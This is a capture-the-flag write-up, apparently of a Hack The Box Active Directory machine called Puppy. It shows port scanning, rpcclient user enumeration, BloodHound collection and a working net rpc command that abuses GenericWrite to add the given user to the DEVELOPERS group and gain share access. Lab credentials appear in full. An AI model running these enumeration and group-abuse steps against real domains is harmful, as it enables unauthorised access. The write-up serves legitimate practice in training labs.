![[Puppy00.png]]
### Description
As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!

### Entry Credentials

```username
levi.james
```

```password
KingofAkron2025!
```

### Network Scan

#### Rustscan

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.70:53
Open 10.10.11.70:88
Open 10.10.11.70:135
Open 10.10.11.70:139
Open 10.10.11.70:111
Open 10.10.11.70:636
Open 10.10.11.70:464
Open 10.10.11.70:445
Open 10.10.11.70:5985
Open 10.10.11.70:9389
Open 10.10.11.70:49664
Open 10.10.11.70:49667
Open 10.10.11.70:49669
Open 10.10.11.70:49674
Open 10.10.11.70:49689
Open 10.10.11.70:61431
Open 10.10.11.70:65181
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.11.70
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 02:32 UTC
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 02:32
Scanning 10.10.11.70 [4 ports]
Completed Ping Scan at 02:32, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 02:32
Scanning puppy.htb (10.10.11.70) [17 ports]
Discovered open port 445/tcp on 10.10.11.70
Discovered open port 53/tcp on 10.10.11.70
Discovered open port 135/tcp on 10.10.11.70
Discovered open port 61431/tcp on 10.10.11.70
Discovered open port 111/tcp on 10.10.11.70
Discovered open port 9389/tcp on 10.10.11.70
Discovered open port 139/tcp on 10.10.11.70
Discovered open port 49689/tcp on 10.10.11.70
Discovered open port 636/tcp on 10.10.11.70
Discovered open port 49674/tcp on 10.10.11.70
Discovered open port 88/tcp on 10.10.11.70
Discovered open port 49664/tcp on 10.10.11.70
Discovered open port 49669/tcp on 10.10.11.70
Discovered open port 65181/tcp on 10.10.11.70
Discovered open port 5985/tcp on 10.10.11.70
Discovered open port 49667/tcp on 10.10.11.70
Discovered open port 464/tcp on 10.10.11.70
Completed SYN Stealth Scan at 02:32, 0.30s elapsed (17 total ports)
Initiating Service scan at 02:32
Scanning 17 services on puppy.htb (10.10.11.70)
Completed Service scan at 02:33, 57.66s elapsed (17 services on 1 host)
NSE: Script scanning 10.10.11.70.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 02:33
Completed NSE at 02:33, 0.56s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 02:33
Completed NSE at 02:34, 17.34s elapsed
Nmap scan report for puppy.htb (10.10.11.70)
Host is up, received echo-reply ttl 126 (0.14s latency).
Scanned at 2025-07-09 02:32:49 UTC for 76s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-07-08 20:39:50Z)
111/tcp   open  rpcbind?      syn-ack ttl 126
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
636/tcp   open  tcpwrapped    syn-ack ttl 126
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
61431/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
65181/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.22 seconds
           Raw packets sent: 21 (900B) | Rcvd: 18 (776B)


```

### Enumeration

#### SmbMap 1
I tried Running SMBMap and SMBClient but no luck as the user given has no access to the network drives.
```bash

```
We can see that DEVS share is there for developers of the puppy domain but we dont have any access to that
#### RPCCLIENT

```bash
rpcclient -U levi.james@puppy.htb%KingofAkron2025! puppy.htb
rpcclient $> querydominfo
Domain:		PUPPY
Server:		
Comment:	
Total Users:	44
Total Groups:	0
Total Aliases:	18
Sequence No:	1
Force Logoff:	18446744073709551615
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x0
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

List of Users extracted:
```text
Administrator
Geust
krbtgt
levi.james
ant.edwards
adam.silver
jamie.willians
steph.cooper
steph.cooper_adm
```

### Bloodhound
Start blood hound and get the bloodhound ingester files using bloodhound python
```bash
bloodhound-python -u levi.james -p KingofAkron2025! -ns 10.10.11.70 -d puppy.htb -c All --zip
```
After that lets upload the zip file to the bloodhound webapp and check our user

![[Puppy01.png]]
Here we can see that the user given to us is member of 2 groups one is a common group `
`Domain Users` and other one is `HR` which is interesting lets check the HR group.
![[Puppy02.png]]
`HR` group has GenericWrite privilege on the `DEVS` group which means we can add our user into the DEVS group lets try doing that since we found the smb share for dev group we might be able to access it after that.
So the given command in linux abuse side of bloodhound is of net rpc 
```bash
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```
So our final command will look like this
```bash
net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
```
Now lets verify if the user is added to the DEVS group
```bash
net rpc group members "DEVELOPERS" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
```
output:
```bash
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```
Its added now lets check the smbmap using this command
```bash
smbmap -H puppy.htb -u levi.james -p KingofAkron2025!
```
Output
```bash
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.70:445	Name: puppy.htb           	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DEV                                               	READ ONLY	DEV-SHARE for PUPPY-DEVS
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections                                                                                                     
```
